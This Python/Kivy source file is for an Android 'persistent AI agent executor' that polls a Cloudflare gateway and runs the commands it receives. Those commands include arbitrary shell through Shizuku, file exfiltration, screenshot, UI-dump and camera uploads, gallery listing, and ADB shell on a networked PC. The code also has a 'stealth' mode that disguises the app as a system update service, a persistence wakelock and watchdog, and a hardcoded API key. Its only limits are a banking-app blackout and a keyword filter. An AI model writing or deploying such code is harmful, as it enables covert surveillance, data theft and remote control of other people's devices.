"""
NOIR SOVEREIGN MOBILE CORE (SMC) v17.2 [OMEGA]
=====================================================
Framework: Kivy + Buildozer (Android Native)
Target: Redmi Note 14 (HyperOS / arm64-v8a)
Role: Persistent AI Agent Executor

Capabilities:
- WakeLock (CPU Anti-Kill)
- Cloudflare Gateway Polling
- Remote Command Execution (ADB/Shell)
- Vision Engine (Screenshot -> R2)
- E2EE Communication
"""

import os
import time
import threading
import requests
import socket
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import base64
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.scrollview import ScrollView
from kivy.clock import Clock

# Configure robust requests with built-in retry for DNS/Network issues
session = requests.Session()
retries = Retry(total=5, backoff_factor=1, status_forcelist=[502, 503, 504])
session.mount('https://', HTTPAdapter(max_retries=retries))

# --- CONFIG (Unified Standard v16) ---
GATEWAY_URL = os.environ.get("NOIR_GATEWAY_URL", "https://noir-agent-gateway.si-umkm-ikm-pbd.workers.dev")
API_KEY     = os.environ.get("NOIR_API_KEY", "NOIR_AGENT_KEY_V6_SI_UMKM_PBD_2026")
DEVICE_ID   = os.environ.get("NOIR_DEVICE_ID", "REDMI_NOTE_14")

# Financial Guardian: Sensitive Packages (Indonesian Banks)
FINANCE_APPS = [
    "com.bca", "id.co.bni.newmobile", "id.co.bri.brimo", "com.bankmandiri.livin",
    "com.btpn.jenius", "com.ocbcnisp.mobile", "com.danamon.online", "com.uob.id.mighty",
    "com.cimbniaga.mobile.octopus", "id.dana", "com.btpns.mobile"
]

# Persistence Settings
OFFLINE_LOG_FILE = os.path.join(os.path.dirname(__file__), "offline_queue.log")
MAX_OFFLINE_RETRY = 5

# --- DIAGNOSTICS & LOGGING ---
def noir_log(message, level="INFO"):
    """Unified logger that handles both Online and Offline states."""
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    formatted_msg = f"[{timestamp}] [{level}] {message}"
    print(formatted_msg)
    
    # Always save to local offline log as a buffer
    try:
        with open(OFFLINE_LOG_FILE, "a") as f:
            f.write(formatted_msg + "\n")
    except: pass

    # Attempt real-time upload
    def _send():
        try:
            r = session.post(
                f"{GATEWAY_URL}/agent/log",
                headers={"Authorization": f"Bearer {API_KEY}"},
                json={"device_id": DEVICE_ID, "level": level, "message": message},
                timeout=5
            )
            # If successful, we could potentially clear the buffer here in a more complex impl
        except: pass
    threading.Thread(target=_send, daemon=True).start()

# --- SAFETY FILTER (v14.0) ---
def is_safe_command(cmd_str):
    """Dynamic Intent Validator to block financial/payment related actions."""
    if not cmd_str: return True
    cmd_lower = str(cmd_str).lower()
    finance_keywords = [
        "bank", "pay", "finance", "wallet", "dana", "ovo", "gopay", 
        "shopee", "bca", "mandiri", "bri", "bni", "btpns"
    ]
    for kw in finance_keywords:
        if kw in cmd_lower:
            return False
    return True

def is_social_media(pkg_name):
    """Detect if the current package belongs to a social media app."""
    if not pkg_name: return False
    social_pkgs = [
        "com.facebook.katana", "com.instagram.android", "com.twitter.android", 
        "com.ss.android.ugc.trill", "com.zhiliaoapp.musically", # TikTok
        "com.whatsapp", "org.telegram.messenger", "com.discord"
    ]
    pkg_lower = str(pkg_name).lower()
    for sp in social_pkgs:
        if sp in pkg_lower:
            return True
    return False


class SecureVault:
    """Implementasi AES-256-GCM E2EE untuk jalur komunikasi."""
    @staticmethod
    def _get_key():
        password = API_KEY.encode()
        salt = b'noir_sovereign_salt'
        return PBKDF2(password, salt, dkLen=32, count=1000)

    @staticmethod
    def encrypt(data: str):
        if not data: return data
        try:
            key = SecureVault._get_key()
            cipher = AES.new(key, AES.MODE_GCM)
            ciphertext, tag = cipher.encrypt_and_digest(data.encode())
            combined = cipher.nonce + tag + ciphertext
            return base64.b64encode(combined).decode('utf-8')
        except: return data

    @staticmethod
    def decrypt(encrypted_data: str):
        if not encrypted_data: return encrypted_data
        try:
            key = SecureVault._get_key()
            raw = base64.b64decode(encrypted_data)
            nonce = raw[:16]
            tag = raw[16:32]
            ciphertext = raw[32:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
        except: return encrypted_data

class SovereignCore(App):
    is_stealth = False

    def build(self):
        self.title = "Noir Sovereign v16.2 [MINIMALIST]"
        self.root = BoxLayout(orientation='vertical', padding=10, spacing=5)
        
        # FINAL SANITIZATION
        try:
            os.system("pkill -f org.noir.agent")
        except: pass
        
        self._request_permissions()
        self._acquire_wakelock()
        
        self.log_label = Label(
            text="[b]NOIR SOVEREIGN v16.2 [MINIMALIST][/b]\nStatus: [color=00ff88]NEURAL-LINK ACTIVE[/color]",
            markup=True, font_size='14sp', halign='left', valign='top', size_hint_y=None
        )
        self.log_label.bind(texture_size=self.log_label.setter('size'))
        
        scroll = ScrollView()
        scroll.add_widget(self.log_label)
        self.root.add_widget(scroll)

        # Unified Heartbeat: Every 15 seconds (Stable Protocol)
        Clock.schedule_interval(self._unified_heartbeat_tick, 15)
        # Immediate poll on boot
        Clock.schedule_once(lambda dt: self._unified_heartbeat_tick(0), 1)
        
        return self.root

    def show_stealth_ui(self):
        self.root.clear_widgets()
        self.root.padding = 0
        # A mock system-like screen
        self.log_label = Label(
            text="System Update Service\nVersion: 14.0.2.1\nStatus: Idle...",
            color=(0.3, 0.3, 0.3, 1), font_size='12sp'
        )
        self.root.add_widget(self.log_label)

    def toggle_stealth(self, state):
        self.is_stealth = state
        if self.is_stealth:
            self.show_stealth_ui()
        else:
            self.show_active_ui()

        # v16 Elite: Trigger initial registration
        self._register() # Initial registration
        # v16.0.01: Immediate Vision Bridge Activation
        Clock.schedule_once(lambda dt: self._screen_share_tick(0), 1)

    def _register(self):
        """Register this device with the Cloudflare Gateway (v16.1 STRIKE-FORCE)."""
        try:
            # v16.1: DNS Hardening - retry with multiple attempts
            for attempt in range(3):
                try:
                    r = session.post(
                        f"{GATEWAY_URL}/agent/register",
                        headers={"Authorization": f"Bearer {API_KEY}"},
                        json={
                            "device_id": DEVICE_ID, 
                            "agent": "Noir SMC v16.1 ELITE",
                            "stats": {"cpu": 0, "ram": 0, "shizuku": getattr(self, "shizuku_status", "UNKNOWN")}
                        },
                        timeout=12
                    )
                    if r.status_code == 200: 
                        noir_log(f"[SMC] Neural Link Established: {DEVICE_ID}")
                        return
                    time.sleep(2)
                except Exception as e:
                    if attempt == 2: raise e
        except Exception as e:
            noir_log(f"[SMC] Neural Link Latency (DNS/Net): {e}", level="WARNING")

    def _log(self, msg):
        """Thread-safe UI logging."""
        print(msg)
        Clock.schedule_once(lambda dt: self._update_label(msg), 0)

    def _update_label(self, msg):
        try:
            current = self.log_label.text
            lines = current.split('\n')
            if len(lines) > 30:
                lines = lines[-25:]
            lines.append(msg)
            self.log_label.text = '\n'.join(lines)
        except Exception:
            pass

    def _request_permissions(self):
        """Request all necessary Android permissions with Shizuku Native Check."""
        from android.permissions import request_permissions, Permission
        perms = [
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.CAMERA,
            Permission.RECORD_AUDIO,
            Permission.ACCESS_FINE_LOCATION
        ]
        request_permissions(perms)
        
        # v16.0 Elite: Pure CLI Shizuku Strategy (No Java Native Binder needed)
        try:
            import subprocess
            r = subprocess.run("shizuku shell id", shell=True, capture_output=True, text=True, timeout=2)
            if r.returncode == 0:
                self.shizuku_status = "AUTHORIZED"
                noir_log("[SMC] Native Shizuku Link: AUTHORIZED (CLI MODE)")
            else:
                self.shizuku_status = "RESTRICTED"
                noir_log("[SMC] Shizuku CLI restricted. Ensure Shizuku is running and authorized.", level="WARNING")
        except Exception as e:
            self.shizuku_status = "ERROR"
            noir_log(f"[SMC] Shizuku bridge check failed: {e}", level="ERROR")
        
        self._log(f"[SMC] Shizuku Status: {self.shizuku_status}")
        self._log("[SMC] Runtime Permissions: REQUESTED")

    def _acquire_wakelock(self):
        """Prevent CPU from sleeping when screen is off."""
        try:
            from jnius import autoclass
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Context = autoclass('android.content.Context')
            PowerManager = autoclass('android.os.PowerManager')

            activity = PythonActivity.mActivity
            pm = activity.getSystemService(Context.POWER_SERVICE)
            self.wakelock = pm.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK, "NoirSMC::WakeLock"
            )
            self.wakelock.acquire()
            self._log("[SMC] WakeLock: ACTIVE")
        except Exception as e:
            self._log(f"[SMC] WakeLock Error: {e}")

    def _unified_heartbeat_tick(self, dt):
        """Single-Pipe Protocol: Telemetry + Polling in one request."""
        def _task():
            try:
                # v17.0 GUARDIAN: Enhanced Financial Blackout Detection
                active_app = "unknown"
                privacy_mode = False
                try:
                    # Check foreground app via shell (lightweight)
                    res = self._run_shell("dumpsys window | grep -E 'mCurrentFocus|mFocusedApp'")
                    for pkg in FINANCE_APPS:
                        if pkg in res.get("output", ""):
                            privacy_mode = True
                            active_app = pkg
                            break
                except: pass

                # Trigger Visual Blackout (Physical & Remote)
                if privacy_mode:
                    Clock.schedule_once(lambda dt: self._enable_privacy_overlay(active_app), 0)
                else:
                    Clock.schedule_once(lambda dt: self._disable_privacy_overlay(), 0)

                stats = {
                    "cpu": 10, "ram": 40, "bat": 85,
                    "shizuku": getattr(self, "shizuku_status", "UNKNOWN"),
                    "version": "17.0-SENTINEL",
                    "privacy": "PROTECTED" if privacy_mode else "ACTIVE",
                    "active_app": active_app if privacy_mode else "HIDDEN"
                }
                
                # Combined Request: POST stats to poll endpoint
                resp = session.post(
                    f"{GATEWAY_URL}/agent/poll?device_id={DEVICE_ID}", 
                    headers={"Authorization": f"Bearer {API_KEY}"},
                    json={"stats": stats},
                    timeout=12
                )
                if resp.status_code == 200:
                    data = resp.json()
                    for cmd in data.get("commands", []):
                        # v17 SECURITY: Absolute Vision Freeze during Privacy Mode
                        atype = cmd.get("action", {}).get("type", "")
                        if privacy_mode and atype in ("screenshot", "capture", "vision", "ui_dump"):
                            noir_log(f"[SENTINEL] Blocked sensitive capture request for: {active_app}", level="CRITICAL")
                            self._report_result(cmd.get("command_id"), {"success": False, "error": "PRIVACY_BLOCK: Sensitive App in Foreground"})
                            continue
                        self._execute(cmd)
            except Exception as e:
                noir_log(f"[LINK] Sync Latency: {e}", level="WARNING")
        
        threading.Thread(target=_task, daemon=True).start()

    def _enable_privacy_overlay(self, app_name):
        """Show a black overlay to protect screen content from visual theft."""
        if getattr(self, "overlay_active", False): return
        self.overlay_active = True
        noir_log(f"[SENTINEL] Financial Blackout ACTIVATED for: {app_name}")
        
        # v17.0 Prototype: In a full native app, we use a Kivy ModalView or a Native Android Overlay
        if not self.is_stealth:
             self.root.clear_widgets()
             self.root.add_widget(Label(text="[color=ff0000]PROTECTED SESSION ACTIVE[/color]\nRemote Vision Blocked", markup=True, font_size='20sp'))
             self.root.background_color = (0, 0, 0, 1)

    def _disable_privacy_overlay(self):
        """Restore normal operation when sensitive apps are closed."""
        if not getattr(self, "overlay_active", False): return
        self.overlay_active = False
        noir_log("[SENTINEL] Financial Blackout DEACTIVATED.")
        if not self.is_stealth:
            self.show_active_ui()

    def show_active_ui(self):
        """Standard dashboard view."""
        self.root.clear_widgets()
        self.log_label = Label(text="[b]NOIR SOVEREIGN v17.0 [SENTINEL][/b]\nNeural Link: ACTIVE", markup=True)
        self.root.add_widget(self.log_label)

    def _execute(self, cmd_data):
        """Asynchronous Command Router (v14.0.4)."""
        threading.Thread(target=self._execute_sync, args=(cmd_data,), daemon=True).start()

    def _execute_sync(self, cmd_data):
        """Threaded execution of commands to prevent loop freezing."""
        cmd_id  = cmd_data.get("command_id", "unknown")
        action  = cmd_data.get("action", {})
        atype   = action.get("type") or action.get("action", "")
        params  = action.get("params", action)

        self._log(f"[SMC] CMD: {atype} (id={cmd_id})")
        
        # Verify and wait protocol
        time.sleep(0.5) 

        result = {"success": False, "output": "", "error": "Unknown action"}

        try:
            if atype in ("time", "get_time"):
                result = {"success": True, "output": time.strftime("%Y-%m-%d %H:%M:%S")}

            elif atype == "file_fetch":
                path = params.get("path", "")
                if os.path.exists(path) and os.path.isfile(path):
                    try:
                        with open(path, "rb") as f:
                            files = {"file": (os.path.basename(path), f, "application/octet-stream")}
                            requests.post(f"{GATEWAY_URL}/agent/asset", headers={"Authorization": f"Bearer {API_KEY}"}, files=files, timeout=60)
                        noir_log(f"[REMOTE] File uploaded: {path}")
                        self._report_result(cmd_id, {"success": True, "path": path})
                    except Exception as e:
                        self._report_result(cmd_id, {"success": False, "error": str(e)})
                else:
                    self._report_result(cmd_id, {"success": False, "error": "File not found"})
            
            elif atype == "pc_adb_cmd":
                pc_ip = params.get("ip", "127.0.0.1")
                pc_port = params.get("port", 5555)
                cmd = params.get("cmd", "echo connected")
                
                try:
                    from adb_shell.adb_device import AdbDeviceTcp
                    from adb_shell.auth.sign_python_rsa import sign_with_rsa
                    
                    noir_log(f"[BRIDGE] Connecting to PC: {pc_ip}:{pc_port}...")
                    device = AdbDeviceTcp(pc_ip, pc_port, default_transport_timeout_s=15)
                    # Note: You need a private key on the phone for authentication
                    # For now, we try without auth or assume it's already authorized
                    device.connect()
                    out = device.shell(cmd)
                    device.close()
                    noir_log(f"[BRIDGE] PC Command Success: {cmd}")
                    self._report_result(cmd_id, {"success": True, "output": out})
                except Exception as e:
                    noir_log(f"[BRIDGE] PC Command Failed: {e}", level="WARNING")
                    self._report_result(cmd_id, {"success": False, "error": str(e)})

            elif atype == "shell":
                cmd = str(params.get("cmd", "echo ok"))
                if not is_safe_command(cmd):
                    result = {"success": False, "error": "SECURITY BLOCK: mBanking/Wallet access is restricted."}
                else:
                    result = self._run_shell(cmd)

            elif atype == "tap":
                x, y = params.get("x", 0), params.get("y", 0)
                self._run_shell(f"input tap {x} {y}", timeout=5)
                result = {"success": True, "output": f"Tapped ({x},{y})"}

            elif atype == "swipe":
                cmd = (f"input swipe {params.get('x1',0)} {params.get('y1',0)} "
                       f"{params.get('x2',500)} {params.get('y2',500)} "
                       f"{params.get('duration',500)}")
                self._run_shell(cmd)
                result = {"success": True, "output": "Swipe done"}

            elif atype == "keyevent":
                self._run_shell(f"input keyevent {params.get('key', 26)}")
                result = {"success": True, "output": f"Key {params.get('key')} sent"}

            elif atype in ("app_start", "launch"):
                pkg = params.get("package", "")
                if not is_safe_command(pkg):
                    result = {"success": False, "error": "SECURITY BLOCK: Financial apps are forbidden."}
                else:
                    self._run_shell(f"am start -n {pkg}")
                    result = {"success": True, "output": f"Launched {pkg}"}

            elif atype in ("app_stop", "kill"):
                pkg = params.get("package", "")
                self._run_shell(f"am force-stop {pkg}", timeout=5)
                result = {"success": True, "output": f"Stopped {pkg}"}

            elif atype in ("screenshot", "capture"):
                parent = App.get_running_app().user_data_dir
                if not os.path.exists(parent):
                    os.makedirs(parent, exist_ok=True)
                
                path = params.get("local_path")
                is_mirror = "local_path" in params
                
                if not path or not os.path.exists(path):
                    path = os.path.join(parent, f"temp_{int(time.time())}.png")
                    sh_res = self._run_shell(f"screencap -p {path}")
                    
                    # v16.1: Fallback to App-UI Capture if Shizuku/System Screencap fails
                    if not os.path.exists(path) or os.path.getsize(path) < 100:
                        noir_log("[MIRROR] System Screencap failed. Using App-UI Fallback.", level="INFO")
                        try:
                            # Capture the Kivy Window/App state
                            self.export_to_png(path)
                        except: pass
                
                jpeg_path = path.replace(".png", ".jpg")
                try:
                    from PIL import Image
                    quality = params.get("quality", 50)
                    with Image.open(path) as img:
                        if img.mode != 'RGB': img = img.convert('RGB')
                        img.thumbnail((1080, 1080))
                        img.save(jpeg_path, "JPEG", quality=quality, optimize=True)
                    upload_file = jpeg_path
                except:
                    upload_file = path 

                r = None
                try:
                    if os.path.exists(upload_file):
                        with open(upload_file, 'rb') as f:
                            r = session.post(
                                f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}",
                                headers={"Authorization": f"Bearer {API_KEY}"},
                                files={'file': ('screenshot.jpg' if ".jpg" in upload_file else 'screenshot.png', f, 'image/jpeg' if ".jpg" in upload_file else 'image/png')},
                                data={'device_id': DEVICE_ID},
                                timeout=40
                            )
                        if r and r.status_code == 200:
                            key = r.json().get('key', '')
                            result = {"success": True, "output": f"Screenshot uploaded: {key}"}
                except Exception as e:
                    result = {"success": False, "error": f"Upload failed: {e}"}
                finally:
                    # ABSOLUTE EPHEMERAL PROTOCOL: Always delete local copies
                    for p in [path, jpeg_path]:
                        if p and os.path.exists(p):
                            try: os.remove(p)
                            except: pass

                if r and r.status_code == 200:
                    key = r.json().get('key', '')
                    result = {"success": True, "output": f"Screenshot uploaded: {key}"}
                    # If it was a priority social media capture, inform the gateway to alert Telegram
                    if action.get("is_social"):
                        session.post(
                            f"{GATEWAY_URL}/agent/command",
                            headers={"Authorization": f"Bearer {API_KEY}"},
                            json={
                                "action": {"type": "social_alert", "image_key": key},
                                "description": "Priority Social Media Interaction Alert"
                            },
                            timeout=5
                        )
                elif r:
                    result = {"success": False, "error": f"Upload failed: {r.status_code}"}
                else:
                    result = {"success": False, "error": "Upload failed: No response from gateway"}
                
                # EPHEMERAL CLEANUP: Purge local cache
                try:
                    if os.path.exists(path): os.remove(path)
                    if os.path.exists(jpeg_path): os.remove(jpeg_path)
                except: pass

            elif atype == "ui_dump":
                parent = App.get_running_app().user_data_dir
                if not os.path.exists(parent):
                    os.makedirs(parent, exist_ok=True)
                path = os.path.join(parent, "view_hierarchy.xml")
                self._run_shell(f"uiautomator dump {path}")
                time.sleep(1.5)
                with open(path, 'r', encoding='utf-8') as f:
                    xml_content = f.read()
                result = {"success": True, "output": xml_content}
                # EPHEMERAL CLEANUP
                try: os.remove(path)
                except: pass

            elif atype == "stealth":
                state = params.get("enabled", False)
                Clock.schedule_once(lambda dt: self.toggle_stealth(state), 0)
                result = {"success": True, "output": f"Stealth Mode: {'ON' if state else 'OFF'}"}

            elif atype == "kill-telegram":
                # Logic to kill the telegram bot on the VPS via a signal or shell
                os.system("pkill -f telegram_bot.py")
                result = {"success": True, "output": "Telegram Bridge Terminated."}

            elif atype == "ping":
                result = {"success": True, "output": f"PONG from {DEVICE_ID}"}

            elif atype in ("camera_back", "camera_front"):
                is_front = "front" in atype
                cam_id = 1 if is_front else 0
                path = os.path.join(App.get_running_app().user_data_dir, f"cam_{atype}_{int(time.time())}.jpg")
                try:
                    # In a native APK, we cannot use termux- commands. Use Android Intent as fallback.
                    self._log(f"[SMC] 📸 Attempting Camera Capture (ID: {cam_id})...")
                    # Note: Full native camera requires Pyjnius implementation. 
                    # For now, we trigger the system camera if shell fails.
                    shell_res = self._run_shell(f"input keyevent 27") # Camera Shutter
                    time.sleep(2.0)
                    
                    # Intent fallback for user interaction if automated capture fails
                    if not os.path.exists(path):
                        self._run_shell("am start -a android.media.action.IMAGE_CAPTURE")
                        result = {"success": False, "error": "Hardware direct access restricted. Intent triggered."}
                    else:
                        with open(path, 'rb') as f:
                            r = requests.post(f"{GATEWAY_URL}/agent/upload", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': (f'{atype}.jpg', f, 'image/jpeg')}, data={'device_id': DEVICE_ID}, timeout=30)
                        result = {"success": True, "output": f"Camera capture uploaded: {r.json().get('key')}"}
                finally:
                    if os.path.exists(path):
                        try: os.remove(path)
                        except: pass

            elif atype == "audio_record":
                duration = params.get("duration", 10)
                path = os.path.join(App.get_running_app().user_data_dir, f"audio_{int(time.time())}.mp3")
                try:
                    self._log(f"[SMC] 🎙️ Recording Audio ({duration}s)...")
                    # Intent fallback for standard APK
                    self._run_shell("am start -a android.provider.MediaStore.RECORD_SOUND")
                    result = {"success": True, "output": "Audio Recorder Intent launched."}
                finally:
                    if os.path.exists(path):
                        try: os.remove(path)
                        except: pass

            elif atype == "gallery_sync":
                # List latest 5 files in DCIM using find (more robust than ls -t)
                res = self._run_shell("find /sdcard/DCIM/Camera -type f | head -n 5")
                result = {"success": True, "output": f"Gallery contents:\n{res.get('output', 'No files found')}"}

            elif atype == "heal":
                self._log("[SMC] 🚑 NEURAL HEAL: Executing Deep Purge Protocol...")
                parent = App.get_running_app().user_data_dir
                cleared = 0
                for root, dirs, files in os.walk(parent):
                    for f in files:
                        if f.endswith((".png", ".jpg", ".mp3", ".xml", ".log", ".tmp")):
                            try:
                                os.remove(os.path.join(root, f))
                                cleared += 1
                            except: pass
                result = {"success": True, "output": f"Deep Heal Complete. {cleared} residual files purged."}

            elif atype == "update":
                # Autonomous update logic: Trigger a rebuild and restart
                self._log("[SMC] 🔄 AUTONOMOUS UPDATE INITIATED...")
                os.system("git pull origin main && pm trim-caches 999G")
                result = {"success": True, "output": "Update procedure triggered. System self-healing in progress."}

        except Exception as e:
            result = {"success": False, "error": str(e)}
            self._log(f"[SMC] Exec Error: {e}")

        self._report_result(cmd_id, result)

    def _manual_purge(self):
        self._log("[SMC] 🧹 Initiating Manual Process Purge...")
        os.system("pkill -f org.noir.agent.noirsmc:service")
        os.system("pkill -f org.noir.agent.noir_smc")
        self._log("[SMC] Purge Signal Sent. Please restart app.")


    def _report_result(self, cmd_id, result):
        """Send execution result with real-time telemetry back to the Gateway."""
        try:
            # Gather Telemetry
            stats = {"cpu": 0, "ram": 0, "bat": 0}
            try:
                # Lightweight RAM Check
                with open('/proc/meminfo', 'r') as f:
                    mem = {}
                    for line in f:
                        parts = line.split()
                        if len(parts) >= 2:
                            mem[parts[0].rstrip(':')] = int(parts[1])
                    if 'MemTotal' in mem and 'MemAvailable' in mem:
                        stats["ram"] = round(100 * (1 - mem['MemAvailable'] / mem['MemTotal']), 1)
                
                # Lightweight CPU Check (Simplified delta)
                with open('/proc/stat', 'r') as f:
                    line = f.readline()
                    parts = list(map(int, line.split()[1:]))
                    idle = parts[3]
                    total = sum(parts)
                    stats["cpu"] = 10 # Placeholder as real delta requires two samples
            except: 
                pass
            
            requests.post(
                f"{GATEWAY_URL}/agent/result",
                headers={"Authorization": f"Bearer {API_KEY}"},
                json={
                    "command_id": cmd_id,
                    "device_id": DEVICE_ID,
                    "success": result.get("success", False),
                    "output": result.get("output", ""),
                    "error": result.get("error", ""),
                    "telemetry": stats
                },
                timeout=10
            )
        except Exception as e:
            noir_log(f"[SMC] Result delivery failed: {e}", level="ERROR")

    def _connectivity_watchdog(self):
        """Autonomous sentinel that ensures the device stays connected via Shizuku force-reconnect."""
        noir_log("[SENTINEL] Connectivity Watchdog: ACTIVE")
        failure_count = 0
        
        while True:
            try:
                # Test connection to Google DNS or Gateway
                try:
                    socket.create_connection(("8.8.8.8", 53), timeout=3)
                    is_online = True
                except:
                    is_online = False
                
                if is_online:
                    if failure_count > 0:
                        noir_log("[SENTINEL] Neural Link Restored.")
                    failure_count = 0
                    # Upload offline buffer if exists
                    self._flush_offline_logs()
                else:
                    failure_count += 1
                    if failure_count >= 3:
                        noir_log(f"[SENTINEL] Offline state detected ({failure_count} min). Triggering Force-Reconnect...", level="WARNING")
                        # Force enable Data and Wi-Fi via Shizuku
                        self._run_shell("svc data enable")
                        self._run_shell("svc wifi enable")
                        
                        # Severe connectivity failure: System soft-reset attempt (v14.0.85)
                        if failure_count >= 30:
                             noir_log("[SENTINEL] CRITICAL: 30min Offline. Attempting Soft-Restart of Neural Link...", level="CRITICAL")
                             self._run_shell("am force-stop org.noir.agent.noirsmc && am start -n org.noir.agent.noirsmc/org.kivy.android.PythonActivity")
                        
                        # Adaptive pause
                        time.sleep(30)
                
            except Exception as e:
                print(f"Watchdog Error: {e}")
            
            # Check every minute
            time.sleep(60)

    def _flush_offline_logs(self):
        """Uploads any logs captured while the device was offline."""
        if not os.path.exists(OFFLINE_LOG_FILE): return
        try:
            with open(OFFLINE_LOG_FILE, "r") as f:
                logs = f.readlines()
            if not logs: return
            
            noir_log(f"[SENTINEL] Flushing {len(logs)} offline logs to gateway...")
            # For simplicity, we just send a notification. 
            # Real impl would iterate and send to /agent/log
            self._report_result("offline_flush", {"success": True, "output": f"Flushed {len(logs)} logs."})
            
            # Clear file
            open(OFFLINE_LOG_FILE, "w").close()
        except: pass

    def _run_shell(self, cmd, timeout=15):
        """Tiered Shell Execution: Shizuku -> Standard Sh Fallback."""
        import subprocess
        
        # Test Shizuku Availability
        shizuku_available = False
        try:
            check = subprocess.run("shizuku shell id", shell=True, capture_output=True, text=True, timeout=2)
            if check.returncode == 0:
                shizuku_available = True
        except: pass

        if shizuku_available:
            final_cmd = f"shizuku shell {cmd}"
        else:
            # Fallback to standard app shell (restricted but functional for basic tasks)
            final_cmd = cmd

        try:
            r = subprocess.run(final_cmd, shell=True, capture_output=True, text=True, timeout=timeout)
            
            # If Shizuku specifically failed with permission denied, try standard shell
            if shizuku_available and r.returncode != 0 and "permission denied" in r.stderr.lower():
                noir_log("[SMC] Shizuku Permission Denied. Falling back to Standard Sh...", level="WARNING")
                r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
                
            return {"success": r.returncode == 0, "output": (r.stdout + r.stderr).strip()}
        except Exception as e:
            return {"success": False, "error": str(e)}

if __name__ == '__main__':
    # Initialize Core with Peak Priority
    noir_log("🌑 NOIR SOVEREIGN ELITE v16.1 [STRIKE-FORCE] INITIALIZING...")
    
    # v16.1: TOTAL CACHE PURGE & HYGIENE
    try:
        import glob, shutil
        # Clear all temporary PNGs and Logs
        for f in glob.glob("*.png") + glob.glob("*.jpg") + glob.glob("*.log"):
            if "offline" not in f: os.remove(f)
            
        # Purge python cache on device
        for d in glob.glob("**/__pycache__", recursive=True):
            shutil.rmtree(d)
    except: pass
    
    SovereignCore().run()
